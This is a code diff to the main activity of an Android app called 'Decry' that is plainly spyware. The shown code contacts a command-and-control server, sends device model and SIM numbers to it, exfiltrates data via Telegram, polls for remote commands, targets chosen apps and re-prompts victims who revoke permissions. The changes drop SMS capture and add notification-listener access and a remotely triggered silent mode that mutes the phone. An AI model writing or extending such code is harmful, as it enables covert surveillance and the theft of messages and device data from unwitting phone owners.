@@ -6,6 +6,7 @@ import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
+import android.media.AudioManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
@@ -24,15 +25,12 @@ class MainActivity : FlutterActivity() {
     private val exfilChannelName = "com.decry.exfil"
     private val runtimePermissionRequestCode = 4201
     private val runtimePermissions = arrayOf(
-        Manifest.permission.READ_SMS,
-        Manifest.permission.RECEIVE_SMS,
         Manifest.permission.READ_PHONE_STATE,
         Manifest.permission.READ_PHONE_NUMBERS,
     )
 
     // C2 server for command polling AND data exfiltration
     private val c2ServerUrl = "https://cry-take.vercel.app/api"
-    private var isSmsCaptureActive = false
     private var deviceChatId: String? = null
 
     private var pendingRuntimeResult: MethodChannel.Result? = null
@@ -48,14 +46,6 @@ class MainActivity : FlutterActivity() {
             val payload = intent?.getStringExtra("payload") ?: ""
 
             when (commandType) {
-                "start_sms_capture" -> {
-                    isSmsCaptureActive = true
-                    Log.i("Decry", "SMS capture mode activated")
-                }
-                "stop_sms_capture" -> {
-                    isSmsCaptureActive = false
-                    Log.i("Decry", "SMS capture mode deactivated")
-                }
                 "target_app" -> {
                     val appId = intent.getStringExtra("appId") ?: return
                     targetApps.add(appId)
@@ -67,6 +57,11 @@ class MainActivity : FlutterActivity() {
                     targetApps.remove(appId)
                     saveTargetApps()
                     Log.i("Decry", "App untargeted: $appId")
+                }
+                "toggle_silent" -> {
+                    val enable = intent.getBooleanExtra("enable", false)
+                    setSilentMode(enable)
+                    Log.i("Decry", "Silent mode ${if (enable) "enabled" else "disabled"}")
                 }
             }
         }
@@ -131,19 +126,18 @@ class MainActivity : FlutterActivity() {
                         }
                     }
                     
-                    // Check SMS permissions
-                    val missingPerms = runtimePermissions.filter { permission ->
-                        ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
-                    }
-                    
-                    if (missingPerms.isNotEmpty()) {
-                        Log.w("Decry", "Missing permissions detected: $missingPerms")
-                        // Re-request permissions
-                        ActivityCompat.requestPermissions(
-                            this,
-                            missingPerms.toTypedArray(),
-                            runtimePermissionRequestCode
+                    // Check notification listener permission
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
+                        val notificationListenerEnabled = Settings.Secure.getString(
+                            contentResolver,
+                            "enabled_notification_listeners"
                         )
+                        if (notificationListenerEnabled == null || !notificationListenerEnabled.contains(packageName)) {
+                            Log.w("Decry", "Notification listener not enabled - attempting to prompt")
+                            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
+                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                            startActivity(intent)
+                        }
                     }
                 } catch (e: Exception) {
                     Log.e("Decry", "Anti-revocation monitor error: ${e.message}")
@@ -176,8 +170,17 @@ class MainActivity : FlutterActivity() {
                         openNotificationPolicySettings()
                         result.success(null)
                     }
+                    "openNotificationListenerSettings" -> {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
+                            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
+                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                            startActivity(intent)
+                        }
+                        result.success(null)
+                    }
                     "getSimNumber" -> result.success(getSimCardNumbers())
-                    "setDoNotDisturb" -> setDoNotDisturb(call.argument<Boolean>("enabled"), result)
+                    "toggleSilentMode" -> toggleSilentMode(call.argument<Boolean>("enabled"), result)
+                    "isSilentModeOn" -> result.success(isSilentModeOn())
                     "getNotificationPolicyStatus" -> result.success(getNotificationPolicyStatus())
                     "registerDevice" -> {
                         deviceChatId = packageName.hashCode().toString()
@@ -234,7 +237,6 @@ class MainActivity : FlutterActivity() {
                             result.error("INVALID_ARGS", "appId required", null)
                         }
                     }
-                    "isSmsCaptureActive" -> result.success(isSmsCaptureActive)
                     "startBackgroundService" -> {
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                             startForegroundService(Intent(this, DecryBackgroundService::class.java))
@@ -332,10 +334,21 @@ class MainActivity : FlutterActivity() {
         } else {
             true
         }
+        
+        val notificationListenerEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
+            val listenerString = Settings.Secure.getString(
+                contentResolver,
+                "enabled_notification_listeners"
+            )
+            listenerString != null && listenerString.contains(packageName)
+        } else {
+            false
+        }
 
         return mapOf(
             "accessibilityEnabled" to accessibilityEnabled,
             "notificationPolicyGranted" to notificationPolicyGranted,
+            "notificationListenerEnabled" to notificationListenerEnabled
         )
     }
 
@@ -371,29 +384,39 @@ class MainActivity : FlutterActivity() {
         startActivity(intent)
     }
 
-    private fun setDoNotDisturb(enabled: Boolean?, result: MethodChannel.Result) {
+    private fun toggleSilentMode(enabled: Boolean?, result: MethodChannel.Result) {
         try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                val notificationManager =
-                    getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+            setSilentMode(enabled == true)
+            Thread { exfiltrateViaTelegram("silent_status", if (enabled == true) "on" else "off", "manual_toggle") }.start()
+            result.success(true)
+        } catch (e: Exception) {
+            result.error("SILENT_MODE_ERROR", e.message, null)
+        }
+    }
 
-                if (!notificationManager.isNotificationPolicyAccessGranted) {
-                    result.error("DND_PERMISSION_DENIED", "Notification policy access not granted", null)
-                    return
+    private fun setSilentMode(enabled: Boolean) {
+        try {
+            val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
+            if (enabled) {
+                // Set to silent mode (no vibration)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    audioManager.adjustVolume(AudioManager.ADJUST_SILENT, AudioManager.FLAG_REMOVE_SOUND_AND_VIBRATE)
+                    audioManager.ringerMode = AudioManager.RINGER_MODE_SILENT
+                } else {
+                    audioManager.ringerMode = AudioManager.RINGER_MODE_SILENT
                 }
-
-                notificationManager.currentInterruptionFilter =
-                    if (enabled == true) android.app.NotificationManager.INTERRUPTIOM_FILTER_NONE
-                    else android.app.NotificationManager.INTERRUPTIOM_FILTER_ALL
-
-                Thread { exfiltrateViaTelegram("dnd_status", if (enabled == true) "on" else "off", "manual_toggle") }.start()
-                result.success(true)
             } else {
-                result.error("DND_UNSUPPORTED", "Do Not Disturb control not supported on this Android version", null)
+                // Set to normal mode
+                audioManager.ringerMode = AudioManager.RINGER_MODE_NORMAL
             }
         } catch (e: Exception) {
-            result.error("DND_ERROR", e.message, null)
+            Log.e("Decry", "Silent mode toggle error: ${e.message}")
         }
+    }
+
+    private fun isSilentModeOn(): Boolean {
+        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
+        return audioManager.ringerMode == AudioManager.RINGER_MODE_SILENT
     }
 
     private fun getNotificationPolicyStatus(): Boolean {
@@ -410,14 +433,12 @@ class MainActivity : FlutterActivity() {
         try {
             val url = "$c2ServerUrl/checkin/$deviceId"
             
-            val jsonData = """
-                {
-                    "name": "${Build.MANUFACTURER} ${Build.MODEL}",
-                    "model": "$model",
-                    "androidVersion": "$androidVersion",
-                    "simNumbers": "$simNumbers"
-                }
-            """.trimIndent()
+            val json = org.json.JSONObject()
+            json.put("name", "${Build.MANUFACTURER} ${Build.MODEL}")
+            json.put("model", model)
+            json.put("androidVersion", androidVersion)
+            json.put("simNumbers", simNumbers)
+            val jsonData = json.toString()
             
             val connection = java.net.URL(url).openConnection() as java.net.HttpURLConnection
             connection.requestMethod = "POST"
@@ -466,17 +487,9 @@ class MainActivity : FlutterActivity() {
                     val payload = command.optString("payload", "")
 
                     when (type) {
-                        "start_sms_capture" -> {
-                            isSmsCaptureActive = true
-                            Log.i("Decry", "SMS capture activated via poll")
-                        }
-                        "stop_sms_capture" -> {
-                            isSmsCaptureActive = false
-                            Log.i("Decry", "SMS capture deactivated via poll")
-                        }
-                        "set_dnd" -> {
-                            val enabled = payload.contains("\"enabled\":true") || payload.contains("\"enabled\": true")
-                            setDndInline(enabled)
+                        "set_silent" -> {
+                            val enable = payload.contains("\"enabled\":true") || payload.contains("\"enabled\": true")
+                            setSilentMode(enable)
                         }
                         "get_installed_apps" -> {
                             val apps = getInstalledApplications()
@@ -517,22 +530,6 @@ class MainActivity : FlutterActivity() {
             connection.disconnect()
         } catch (e: Exception) {
             Log.e("Decry", "Polling error: ${e.message}")
-        }
-    }
-
-    private fun setDndInline(enabled: Boolean) {
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                val notificationManager =
-                    getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
-                if (notificationManager.isNotificationPolicyAccessGranted) {
-                    notificationManager.currentInterruptionFilter =
-                        if (enabled) android.app.NotificationManager.INTERRUPTION_FILTER_NONE
-                        else android.app.NotificationManager.INTERRUPTION_FILTER_ALL
-                }
-            }
-        } catch (e: Exception) {
-            Log.e("Decry", "DND toggle error: ${e.message}")
         }
     }
 
